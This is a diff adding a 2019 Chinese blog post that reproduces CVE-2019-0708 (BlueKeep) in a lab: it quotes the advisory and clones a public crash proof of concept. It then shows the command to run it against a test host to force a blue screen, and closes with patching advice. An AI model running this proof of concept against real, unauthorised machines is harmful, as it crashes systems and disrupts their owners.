@@ -219,7 +219,227 @@
         </header>
     </div>
 </nav>
-      <div class="body-wrap"></div>
+      <div class="body-wrap"><article id="post-【漏洞复现】17年的勒索病毒又双叕卷土重来了？" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/year/190615-013724.html" class="article-date">
+      <time datetime="2019-06-14T17:37:24.000Z" itemprop="datePublished">2019-06-15</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      【漏洞复现 CVE 2019-0708】17年的勒索病毒又双叕卷土重来了？
+    </h1>
+  
+
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/漏洞复现/">漏洞复现</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CVE-2019-0708/">CVE 2019-0708</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><blockquote>
+<p>2019年5月14日微软官方发布安全补丁，修复了Windows远程桌面服务的远程代码执行漏洞，该漏洞影响了某些旧版本的Windows系统。此漏洞是预身份验证且无需用户交互，这就意味着这个漏洞可以通过网络蠕虫的方式被利用。利用此漏洞的任何恶意软件都可能从被感染的计算机传播到其他易受攻击的计算机，其方式与2017年WannaCry恶意软件的传播方式类似。</p>
+</blockquote>
+<p>以上内容来自360网络安全响应中心。<br>从微软官方的消息一出，各大安全厂商都开始发布了漏洞预警，那段时间我也一直在找对应的POC，但要不就是不能利用的POC，要不就是利用以前漏洞写的POC，更有甚着点击attack后给你惊喜。</p>
+<a id="more"></a>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/2019-07081.gif" alt><br>看到这个图片的时候，真的一副生无可恋的样子，随着时间推移，渐渐的也就不怎么关注这个漏洞了。<br>直到今天，看到网上有人发一些关于这个漏洞的利用复现视频的时候，才意识到已经过去正好一个月的，此时POC也早就被公布了。<br>早在在5月31日的时候，n1xbyte就在Github上发布了利用该漏洞导致系统蓝屏的可用POC ,所以我们来复现看看吧。</p>
+<h1 id="0x01-下载POC"><a href="#0x01-下载POC" class="headerlink" title="0x01 下载POC"></a>0x01 下载POC</h1><p>首先git clone代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/n1xbyte/CVE-2019-0708.git</span><br><span class="line">cd CVE-2019-0708</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/2019-07082.png" alt></p>
+<h1 id="0x02-开始复现"><a href="#0x02-开始复现" class="headerlink" title="0x02 开始复现"></a>0x02 开始复现</h1><p>1、为了顺利复现成功，需要将被攻击机的远程桌面设为允许，防火墙也需要关掉。<br>2、被攻击机的IP地址与操作系统信息如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#被攻击主机</span><br><span class="line">ip地址：192.168.1.106</span><br><span class="line">系统类型：64位</span><br></pre></td></tr></table></figure>
+
+<p>3、安装需要的库后执行POC</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install impacket</span><br><span class="line">python3 crashpoc.py 192.168.1.106 64  #python3 crashpoc.py ip地址 系统类型</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/2019-07083.png" alt><br>POC被成功被执行，虽然现阶段只是让目标蓝屏，但是对这个漏洞的利用手段绝对不会止步于此。</p>
+<h1 id="0x03-修复方案"><a href="#0x03-修复方案" class="headerlink" title="0x03 修复方案"></a>0x03 修复方案</h1><p>1、最简便的方法就是安装一个安全管家，比如火绒、360之类的<br>2、把系统的自动更新打开或者到微软官网<a href="https://portal.msrc.microsoft.com/zh-cn/security-guidance/advisory/CVE-2019-0708" target="_blank" rel="noopener">下载补丁</a><br>3、把自己电脑上的远程桌面关掉、防火墙开启</p>
+<h1 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h1><p>总是有人说没有绝对的安全，当然事实也确实是如此，但是只要我们平时养成一个良好的安全习惯，还是可以避免很多病毒木马的侵害的，毕竟很多的恶意程序都是广撒网，捕的鱼多不多就是另一回事儿了。</p>
+<p><strong>最后再次强调，不得将本文用作违法犯罪目的，本文只用作技术分享交流学习使用。</strong></p>
+<p>下面为视频演示：</p>
+<div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=55626994&cid=97251766&page=1" " scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;"> </iframe></div>
+
+<p>如果视频不能全屏播放，请点击<a href="https://www.bilibili.com/video/av55626994/" title="视频地址" target="_blank" rel="noopener">视频地址</a>进行观看。</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/year/190615-013724.html">【漏洞复现 CVE 2019-0708】17年的勒索病毒又双叕卷土重来了？</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问 Teams Six 的个人博客">Teams Six</a></p>
+        <p><span>发布时间:</span>2019年06月15日 - 01时37分</p>
+        <p><span>最后更新:</span>2019年10月16日 - 17时33分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/year/190615-013724.html" title="【漏洞复现 CVE 2019-0708】17年的勒索病毒又双叕卷土重来了？">http://www.teamssix.com/year/190615-013724.html</a>
+            <span class="copy-path" data-clipboard-text="原文: http://www.teamssix.com/year/190615-013724.html　　作者: Teams Six" title></span>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target="_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a href="/year/190618-225704.html" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          【Python实例】让Python告诉你当前最火的电影是什么
+        
+      </div>
+    </a>
+  
+  
+    <a href="/year/190614-134948.html" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">对于连接ssh时连时断的解决方法</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-下载POC"><span class="toc-number">2.</span> <span class="toc-text">0x01 下载POC</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-开始复现"><span class="toc-number">3.</span> <span class="toc-text">0x02 开始复现</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-修复方案"><span class="toc-number">4.</span> <span class="toc-text">0x03 修复方案</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-小结"><span class="toc-number">5.</span> <span class="toc-text">0x04 小结</span></a></li></ol>
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+<input type="button" id="tocButton" value="隐藏目录" title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+
+
+    
+        <section id="comments">
+  <div id="disqus_thread"></div>
+    <script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'TeamsSix'; // required: replace example with your forum shortname
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</section>
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/year/190618-225704.html" title="上一篇: 【Python实例】让Python告诉你当前最火的电影是什么">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/year/190614-134948.html" title="下一篇: 对于连接ssh时连时断的解决方法">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/year/191014-090745.html">经过一场面试，我发现我还存在这些不足</a></li><li class="post-list-item"><a class="post-list-link" href="/year/191009-164624.html">【经验总结】VPS欠费后Hexo博客521无法访问</a></li><li class="post-list-item"><a class="post-list-link" href="/year/190925-114420.html">【CTF】记录一次CTF比赛的Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/year/190720-121144.html">【经验总结】记录一次Docker下安装CTFd的错误</a></li><li class="post-list-item"><a class="post-list-link" href="/year/190717-124041.html">分享一张超详细的渗透测试导图</a></li><li class="post-list-item"><a class="post-list-link" href="/year/190715-102622.html">【工具】批量网站CMS指纹识别</a></li><li class="post-list-item"><a class="post-list-link" href="/year/190709-202131.html">【经验总结】小白挖洞十天经验分享</a></li><li class="post-list-item"><a class="post-list-link" href="/year/190703-221956.html">【渗透实例】记录一次XSS渗透过程</a></li><li class="post-list-item"><a class="post-list-link" href="/year/190619-202702.html">【Python实例】让Python告诉你B站观影指南</a></li><li class="post-list-item"><a class="post-list-link" href="/year/190618-225704.html">【Python实例】让Python告诉你当前最火的电影是什么</a></li><li class="post-list-item"><a class="post-list-link" href="/year/190615-013724.html">【漏洞复现 CVE 2019-0708】17年的勒索病毒又双叕卷土重来了？</a></li><li class="post-list-item"><a class="post-list-link" href="/year/190614-134948.html">对于连接ssh时连时断的解决方法</a></li><li class="post-list-item"><a class="post-list-link" href="/year/190614-111512.html">hexo自适应BiliBili视频大小的解决方案</a></li><li class="post-list-item"><a class="post-list-link" href="/year/190613-191825.html">【Python实例】批量下载斗罗大陆高清视频</a></li><li class="post-list-item"><a class="post-list-link" href="/year/191612-123700.html">为自定义域名的Hexo博客升级到Https网站</a></li></ul>
+    
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+    <script>
+        $(".post-list").addClass("toc-article");
+        // $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#toc, .switch-btn, .switch-area").toggle();
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+                $(".switch-btn, .switch-area").fadeToggle(300);
+            }
+        })
+    </script>
+
+
+
+
+    <script>
+        
+</script></div>
       <footer id="footer">
     <div class="outer">
         <div id="footer-info">
